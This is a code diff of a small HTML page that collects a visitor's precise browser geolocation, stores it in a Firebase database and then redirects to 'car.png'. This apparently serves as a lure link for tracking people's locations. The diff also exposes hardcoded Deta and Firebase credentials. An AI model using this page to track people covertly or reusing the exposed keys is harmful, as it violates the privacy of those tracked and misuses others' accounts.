@@ -3,28 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visitor Location Tracker</title>
+    <title>Location Tracker</title>
+    <!-- Include Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-database.js"></script>
 </head>
 <body>
-    <h1>Welcome to Visitor Location Tracker</h1>
+    <h1>Location Tracker</h1>
     <div id="loadingMessage">Fetching your location...</div>
-    
-    <!-- Include the Deta SDK using module syntax -->
-    <script type="module">
-        // Import the Deta Base module with HTTPS protocol
-        import { Base } from 'https://cdn.deta.space/js/deta@latest/deta.mjs';
 
-        // Initialize Deta Base with your project key and database name
-        const deta = Base('d0wnfstadsw_5RpqNBcY9k8wnBBfouQUXteXM6JRX546');
-        const db = deta.Base('Location');
+    <!-- Firebase Configuration and Initialization -->
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyDhybbF-iUi5jjEzYa7tallWkvlJmoqkmg",
+            authDomain: "location-ab4c9.firebaseapp.com",
+            databaseURL: "https://location-ab4c9-default-rtdb.firebaseio.com",
+            projectId: "location-ab4c9",
+            storageBucket: "location-ab4c9.appspot.com",
+            messagingSenderId: "250509744763",
+            appId: "1:250509744763:web:7a25b112ef4f8d3ac72e0e"
+        };
 
-        // Function to get the visitor's location
-        async function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(savePosition, errorHandler, { enableHighAccuracy: true });
-            } else {
-                console.log("Geolocation is not supported by this browser.");
-            }
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+    </script>
+
+    <!-- Your JavaScript code for location tracking -->
+    <script>
+        // Function to save the visitor's location in Firebase Realtime Database
+        async function savePosition(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            console.log("Latitude: " + latitude + " Longitude: " + longitude);
+
+            // Save the location data in Firebase Realtime Database
+            const database = firebase.database();
+            const ref = database.ref('visitor_location');
+            ref.push({ latitude: latitude, longitude: longitude });
+
+            // Show an alert
+            alert("Location data saved successfully!");
+            // Redirect to "car.png" or perform other actions
+            window.location.replace("car.png");
         }
 
         // Function to handle errors in geolocation
@@ -33,23 +53,14 @@
             document.getElementById('loadingMessage').textContent = "Error getting your location.";
         }
 
-        // Function to save the visitor's location in Deta Space database and show an alert
-        async function savePosition(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
-            console.log("Latitude: " + latitude + " Longitude: " + longitude);
-
-            // Store the location data in your Deta Space database
-            try {
-                const response = await db.put({ latitude: latitude, longitude: longitude }, "visitor_location");
-                console.log('Location data saved successfully:', response);
-                // Show an alert
-                alert("Location data saved successfully!");
-                // Redirect to "car.png"
-                window.location.replace("car.png");
-            } catch (error) {
-                console.error('Error saving location data:', error);
-                document.getElementById('loadingMessage').textContent = "Error saving your location data.";
+        // Function to get the visitor's location
+        async function getLocation() {
+            console.log('Getting location...');
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(savePosition, errorHandler, { enableHighAccuracy: true });
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+                document.getElementById('loadingMessage').textContent = "Geolocation is not supported by this browser.";
             }
         }
 
